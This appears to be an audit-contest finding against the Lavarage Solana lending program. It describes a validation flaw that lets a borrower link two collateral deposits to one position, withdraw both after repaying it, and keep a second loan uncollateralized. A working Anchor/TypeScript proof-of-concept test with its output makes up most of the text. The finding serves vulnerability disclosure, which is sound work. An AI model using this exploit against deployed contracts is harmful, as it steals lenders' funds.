[H-02] A borrower can borrow SOL without backing it by a collateral
Submitted byKoolex, also found byArabadzhievandrvierdiiev
The borrower can borrow SOL from the lender without backing it by a collateral. This is possible because the borrower can open two positions at the same time (same TX) but link bothaddCollateralto one position. Althoughborrowchecks the existence ofaddCollateral, it doesn’t check if the positions match.
This can be done as follows:
The borrower opens two positions (Pos#1andPos#2).When opening the position, the borrower links both collateral toPos#1.The borrower repaysPos#1.borrowed, Thus, withdrawing both collaterals.Now, the protocol has no collaterals.The borrower got away withPos#2.borrowedwithout adding a collateral.
Check the PoC below, It demonstrates how a thief could perform the scenario above.
Proof of Concept
Please create a filetests/poc_extract_col_and_sol_lavarage.spec.ts) , then run the following command:
```shORACLE_PUB_KEY=ATeSYS4MQUs2d6UQbBvs9oSNvrmNPU1ibnS2Dmk21BKZ anchor test```
You should see the following output:
```shconsole.log===== Initial Amounts======at tests/poc_extract_col_and_sol_lavarage.spec.ts:311:13console.logPos#1.collateral    :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:313:13console.logPos#2.collateral    :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:314:13console.logBorrower Collateral :  200000000000000000nat tests/poc_extract_col_and_sol_lavarage.spec.ts:315:13console.logNode Sol            :  500001294560at tests/poc_extract_col_and_sol_lavarage.spec.ts:317:13console.logBorrower Sol        :  499999499996989200at tests/poc_extract_col_and_sol_lavarage.spec.ts:318:13console.log===== After Borrow #1 and #2======at tests/poc_extract_col_and_sol_lavarage.spec.ts:335:13console.logPos#1.collateral    :  200000000000000000nat tests/poc_extract_col_and_sol_lavarage.spec.ts:355:13console.logPos#2.collateral    :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:356:13console.logBorrower Collateral :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:357:13console.logNode Sol            :  495001294555at tests/poc_extract_col_and_sol_lavarage.spec.ts:361:13console.logBorrower Sol        :  499999504967724700at tests/poc_extract_col_and_sol_lavarage.spec.ts:362:13console.log>>===== Now, repay borrow#1 only and withdraw all of my collaterals======>>at tests/poc_extract_col_and_sol_lavarage.spec.ts:400:13console.log===== After Successful Repay ======at tests/poc_extract_col_and_sol_lavarage.spec.ts:404:13console.logPos#1.collateral    :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:422:13console.logPos#2.collateral    :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:423:13console.logBorrower Collateral :  200000000000000000nat tests/poc_extract_col_and_sol_lavarage.spec.ts:424:13console.logNode Sol            :  495001294560at tests/poc_extract_col_and_sol_lavarage.spec.ts:428:13console.logBorrower Sol        :  499999504967719600at tests/poc_extract_col_and_sol_lavarage.spec.ts:429:13PASS  tests/poc_extract_col_and_sol_lavarage.spec.ts (7.679 s)lavarage✓ Should mint new token! (1849 ms)✓ Should create lpOperator node wallet (451 ms)✓ Should create trading pool (454 ms)✓ Should fund node wallet (463 ms)✓ Should set maxBorrow (455 ms)✓ Hacker can extract SOL and Collaterl (1842 ms)Test Suites: 1 passed, 1 totalTests:       6 passed, 6 totalSnapshots:   0 totalTime:        7.749 sRan all test suites.```
Summary of balances:
Before the attackLender SOL => 500.001294560Lender CollateralPos#1=> 0Lender CollateralPos#2=> 0Borrower SOL => 499999499.996989200Borrower Collateral => 200000000.000000000After borrowing (Notice thatPos#2has no collateral)Lender SOL => 495.001294555Lender CollateralPos#1=> 200000000.000000000Lender CollateralPos#2=> 0Borrower SOL => 499999504.967724700Borrower Collateral => 0After repayLender SOL => 495.001294560Lender CollateralPos#1=> 0Lender CollateralPos#2=> 0Borrower SOL => 499999504.967719600Borrower Collateral => 200000000.000000000
Test file:
import*asanchorfrom'@coral-xyz/anchor';import{Keypair,PublicKey,Signer,SystemProgram,SYSVAR_CLOCK_PUBKEY,SYSVAR_INSTRUCTIONS_PUBKEY,Transaction,}from'@solana/web3.js';import{Lavarage}from'../target/types/lavarage';import{createMint,createTransferCheckedInstruction,getAccount,getOrCreateAssociatedTokenAccount,mintTo,TOKEN_PROGRAM_ID,}from'@solana/spl-token';import{web3}from'@coral-xyz/anchor';exportfunctiongetPDA(programId,seed) {constseedsBuffer=Array.isArray(seed) ?seed: [seed];returnweb3.PublicKey.findProgramAddressSync(seedsBuffer,programId)[0];}describe('lavarage', ()=>{anchor.setProvider(anchor.AnchorProvider.env());constprogram:anchor.Program<Lavarage> =anchor.workspace.Lavarage;constnodeWallet=anchor.web3.Keypair.generate();constanotherPerson=anchor.web3.Keypair.generate();constseed=anchor.web3.Keypair.generate();// TEST ONLY!!! DO NOT USE!!!constoracleKeyPair=anchor.web3.Keypair.fromSecretKey(Uint8Array.from([70,207,196,18,254,123,0,205,199,137,184,9,156,224,62,74,209,0,80,73,146,151,175,68,182,180,53,91,214,7,167,209,140,140,158,10,59,141,76,114,109,208,44,110,77,64,149,121,7,226,125,0,105,29,76,131,99,95,123,206,81,5,198,140,]),);lettokenMint;letuserTokenAccount;lettokenMint2;letuserTokenAccount2;constprovider=anchor.getProvider();asyncfunctionmintMockTokens(people:Signer,provider:anchor.Provider,amount:number,):Promise<any> {constconnection=provider.connection;constsignature=awaitconnection.requestAirdrop(people.publicKey,2000000000,);awaitconnection.confirmTransaction(signature,'confirmed');// Create a new mintconstmint=awaitcreateMint(connection,people,people.publicKey,null,9,// Assuming a decimal place of 9);// Get or create an associated token account for the recipientconstrecipientTokenAccount=awaitgetOrCreateAssociatedTokenAccount(connection,people,mint,provider.publicKey,);// Mint new tokens to the recipient's token accountawaitmintTo(connection,people,mint,recipientTokenAccount.address,people,amount,);return{mint,recipientTokenAccount,};}// Setup phaseit('Should mint new token!',async()=>{const{mint,recipientTokenAccount} =awaitmintMockTokens(anotherPerson,provider,200000000000000000,// 200000000000,);tokenMint=mint;userTokenAccount=recipientTokenAccount;},20000);it('Should create lpOperator node wallet',async()=>{awaitprogram.methods.lpOperatorCreateNodeWallet().accounts({nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,operator:program.provider.publicKey,}).signers([nodeWallet]).rpc();});it('Should create trading pool',async()=>{consttradingPool=getPDA(program.programId, [Buffer.from('trading_pool'),provider.publicKey.toBuffer(),tokenMint.toBuffer(),]);awaitprogram.methods.lpOperatorCreateTradingPool(50).accounts({nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,operator:program.provider.publicKey,tradingPool,mint:tokenMint,}).rpc();});it('Should fund node wallet',async()=>{awaitprogram.methods.lpOperatorFundNodeWallet(newanchor.BN(500000000000)).accounts({nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,funder:program.provider.publicKey,}).rpc();});it('Should set maxBorrow',async()=>{consttradingPool=getPDA(program.programId, [Buffer.from('trading_pool'),provider.publicKey.toBuffer(),tokenMint.toBuffer(),]);// X lamports per 1 Tokenawaitprogram.methods.lpOperatorUpdateMaxBorrow(newanchor.BN(50)).accountsStrict({tradingPool,nodeWallet:nodeWallet.publicKey,operator:provider.publicKey,systemProgram:anchor.web3.SystemProgram.programId,}).rpc();});// repayit('Hacker can extract SOL and Collaterl',async()=>{//constseed=Keypair.generate();constseed2=Keypair.generate();consttradingPool=getPDA(program.programId, [Buffer.from('trading_pool'),provider.publicKey.toBuffer(),tokenMint.toBuffer(),]);// create ATA for position accountconstpositionAccount=getPDA(program.programId, [Buffer.from('position'),provider.publicKey?.toBuffer(),tradingPool.toBuffer(),// unique identifier for the positionseed.publicKey.toBuffer(),]);constpositionATA=awaitgetOrCreateAssociatedTokenAccount(provider.connection,anotherPerson,tokenMint,positionAccount,true,);// create ATA for position account 2constpositionAccount2=getPDA(program.programId, [Buffer.from('position'),provider.publicKey?.toBuffer(),tradingPool.toBuffer(),// unique identifier for the positionseed2.publicKey.toBuffer(),]);constpositionATA2=awaitgetOrCreateAssociatedTokenAccount(provider.connection,anotherPerson,tokenMint,positionAccount2,true,);// actual borrowconstborrowIx=awaitprogram.methods.tradingOpenBorrow(newanchor.BN(10),newanchor.BN(5)).accountsStrict({positionAccount,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,randomAccountAsId:seed.publicKey,// frontend fee receiver. could be any address. opening fee 0.5%feeReceipient:anotherPerson.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:anchor.web3.SYSVAR_CLOCK_PUBKEY,instructions:anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,}).instruction();consttransferIx=createTransferCheckedInstruction(userTokenAccount.address,tokenMint,positionATA.address,provider.publicKey,100000000000000000,9,);consttransferIx2=createTransferCheckedInstruction(userTokenAccount.address,tokenMint,positionATA.address,// transfer to the other account (1st pos)provider.publicKey,100000000000000000,9,);// the param in this method is deprecated. should be removed.constaddCollateralIx=awaitprogram.methods.tradingOpenAddCollateral().accountsStrict({positionAccount,tradingPool,systemProgram:anchor.web3.SystemProgram.programId,trader:provider.publicKey,randomAccountAsId:seed.publicKey,mint:tokenMint,toTokenAccount:positionATA.address,// I need to create this account}).instruction();// actual borrow 2constborrowIx2=awaitprogram.methods.tradingOpenBorrow(newanchor.BN(10000000000),newanchor.BN(5000000000)).accountsStrict({positionAccount:positionAccount2,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,randomAccountAsId:seed2.publicKey,// frontend fee receiver. could be any address. opening fee 0.5%feeReceipient:anotherPerson.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:anchor.web3.SYSVAR_CLOCK_PUBKEY,instructions:anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,}).instruction();// the param in this method is deprecated. should be removed.constaddCollateralIx2=awaitprogram.methods.tradingOpenAddCollateral().accountsStrict({positionAccount:positionAccount,tradingPool,systemProgram:anchor.web3.SystemProgram.programId,trader:provider.publicKey,randomAccountAsId:seed.publicKey,mint:tokenMint,toTokenAccount:positionATA.address,}).instruction();lettokenAccount=awaitgetAccount(provider.connection,positionATA.address,);lettokenAccount2=awaitgetAccount(provider.connection,positionATA2.address,);letuserTokenAcc=awaitgetAccount(provider.connection,userTokenAccount.address,);console.log("===== Initial Amounts======");console.log("Pos#1.collateral    : ",tokenAccount.amount);console.log("Pos#2.collateral    : ",tokenAccount2.amount);console.log("Borrower Collateral : ",userTokenAcc.amount);console.log("Node Sol            : ",awaitprovider.connection.getBalance(nodeWallet.publicKey));console.log("Borrower Sol        : ",awaitprovider.connection.getBalance(provider.publicKey));consttx_borrow=newTransaction().add(borrowIx).add(transferIx).add(addCollateralIx).add(borrowIx2).add(transferIx2).add(addCollateralIx2);// add collateral but link it to first Posawaitprovider.sendAll([{tx:tx_borrow}]);console.log("===== After Borrow #1 and #2======");tokenAccount=awaitgetAccount(provider.connection,positionATA.address,);tokenAccount2=awaitgetAccount(provider.connection,positionATA2.address,);userTokenAcc=awaitgetAccount(provider.connection,userTokenAccount.address,);consttokenAccount_amount=tokenAccount.amount;constuserTokenAcc_amount=userTokenAcc.amount;console.log("Pos#1.collateral    : ",tokenAccount_amount);console.log("Pos#2.collateral    : ",tokenAccount2.amount);console.log("Borrower Collateral : ",userTokenAcc_amount);constnode_balance=awaitprovider.connection.getBalance(nodeWallet.publicKey);constuser_balance=awaitprovider.connection.getBalance(provider.publicKey);console.log("Node Sol            : ",node_balance);console.log("Borrower Sol        : ",user_balance);constreceiveCollateralIx=awaitprogram.methods.tradingCloseBorrowCollateral().accountsStrict({positionAccount:positionAccount,trader:provider.publicKey,tradingPool,instructions:SYSVAR_INSTRUCTIONS_PUBKEY,systemProgram:anchor.web3.SystemProgram.programId,clock:SYSVAR_CLOCK_PUBKEY,randomAccountAsId:seed.publicKey,mint:tokenMint,toTokenAccount:userTokenAccount.address,fromTokenAccount:positionATA.address,tokenProgram:TOKEN_PROGRAM_ID,}).instruction();constrepaySOLIx=awaitprogram.methods// .tradingCloseRepaySol(new anchor.BN(20000), new anchor.BN(9998)).tradingCloseRepaySol(newanchor.BN(0),newanchor.BN(9998)).accountsStrict({positionAccount:positionAccount,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:SYSVAR_CLOCK_PUBKEY,randomAccountAsId:seed.publicKey,feeReceipient:anotherPerson.publicKey,}).instruction();consttx_repay=newTransaction().add(receiveCollateralIx).add(repaySOLIx);console.log(">>===== Now, repay borrow#1 only and withdraw all of my collaterals======>>");awaitprovider.sendAll([{tx:tx_repay}]);console.log("===== After Successful Repay ======");tokenAccount=awaitgetAccount(provider.connection,positionATA.address,);tokenAccount2=awaitgetAccount(provider.connection,positionATA2.address,);userTokenAcc=awaitgetAccount(provider.connection,userTokenAccount.address,);consttokenAccount_amount2=tokenAccount.amount;constuserTokenAcc_amount2=userTokenAcc.amount;console.log("Pos#1.collateral    : ",tokenAccount_amount2);console.log("Pos#2.collateral    : ",tokenAccount2.amount);console.log("Borrower Collateral : ",userTokenAcc_amount2);constnode_balance2=awaitprovider.connection.getBalance(nodeWallet.publicKey);constuser_balance2=awaitprovider.connection.getBalance(provider.publicKey);console.log("Node Sol            : ",node_balance2);console.log("Borrower Sol        : ",user_balance2);});});
Recommended Mitigation Steps
Onborrowvalidate that theTradingOpenAddCollateralhas the relevant position account.
Assessed type
Invalid Validation
piske-alex (Lavarage) confirmed